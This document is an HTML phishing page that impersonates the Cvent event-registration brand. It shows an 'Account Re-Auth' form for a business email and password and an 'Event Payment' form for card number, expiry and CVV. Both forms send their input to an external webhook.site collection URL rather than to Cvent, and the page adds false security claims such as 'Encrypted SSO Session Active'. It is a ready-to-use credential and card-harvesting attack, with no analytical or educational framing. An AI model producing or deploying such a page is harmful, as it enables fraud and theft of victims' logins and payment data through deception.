<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cvent Registration Management</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; color: #333; }
        
        /* CLEAN CORPORATE HEADER */
        .header { background: #fff; padding: 40px 0; text-align: center; border-bottom: 4px solid #0066cc; }
        .logo-text { font-size: 38px; font-weight: 700; color: #111; letter-spacing: -1.5px; }
        .logo-text span { color: #0066cc; }

        .wrapper { display: flex; min-height: calc(100vh - 130px); }
        .pane { flex: 1; padding: 60px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        
        .left { background-color: #fcfcfc; border-right: 1px solid #eee; }
        .right { background-color: #ffffff; }
        
        .box { width: 100%; max-width: 360px; }
        h2 { font-size: 24px; margin-bottom: 10px; font-weight: 600; color: #000; }
        p { font-size: 15px; color: #666; margin-bottom: 30px; line-height: 1.5; }
        
        .field { margin-bottom: 20px; text-align: left; }
        label { display: block; font-size: 12px; font-weight: 700; color: #444; margin-bottom: 8px; text-transform: uppercase; }
        input { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; background: #fff; }
        input:focus { border-color: #0066cc; outline: none; }
        
        .row { display: flex; gap: 15px; }
        button { width: 100%; padding: 16px; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
        
        .btn-blue { background-color: #0066cc; }
        .btn-green { background-color: #2e7d32; }
        
        .status { color: #2e7d32; font-size: 12px; font-weight: 700; display: block; margin-top: 15px; text-align: center; }
        .footer { margin-top: 40px; font-size: 12px; color: #999; text-align: center; }
    </style>
</head>
<body>

    <header class="header">
        <div class="logo-text"><span>c</span>vent</div>
    </header>

    <div class="wrapper">
        <!-- AUTH SECTION -->
        <div class="pane left">
            <div class="box">
                <h2>Account Re-Auth</h2>
                <p>Please re-verify your workspace credentials to synchronize this registration.</p>
                <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
                    <div class="field">
                        <label>Business Email</label>
                        <input type="email" name="user_email" placeholder="name@company.com" required>
                    </div>
                    <div class="field">
                        <label>Password</label>
                        <input type="password" name="user_pass" placeholder="••••••••" required>
                    </div>
                    <button type="submit" class="btn-blue">Verify Connection</button>
                    <span class="status">● Encrypted SSO Session Active</span>
                </form>
            </div>
        </div>

        <!-- PAYMENT SECTION -->
        <div class="pane right">
            <div class="box">
                <h2>Event Payment</h2>
                <p>Amount Due: <strong>$250.00 USD</strong>. Enter payment details to confirm your ticket.</p>
                <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
                    <div class="field">
                        <label>Cardholder Name</label>
                        <input type="text" name="cc_name" placeholder="John Doe" required>
                    </div>
                    <div class="field">
                        <label>Credit Card Number</label>
                        <input type="text" name="cc_num" placeholder="0000 0000 0000 0000" required maxlength="16">
                    </div>
                    <div class="row">
                        <div class="field" style="flex: 2;">
                            <label>Expiration</label>
                            <input type="text" name="cc_exp" placeholder="MM/YY" required maxlength="5">
                        </div>
                        <div class="field" style="flex: 1;">
                            <label>CVV</label>
                            <input type="text" name="cc_cvv" placeholder="123" required maxlength="4">
                        </div>
                    </div>
                    <button type="submit" class="btn-green">Authorize Payment</button>
                    <div class="footer">Compliant with Global Financial Security Standards</div>
                </form>
            </div>
        </div>
    </div>

</body>
</html>
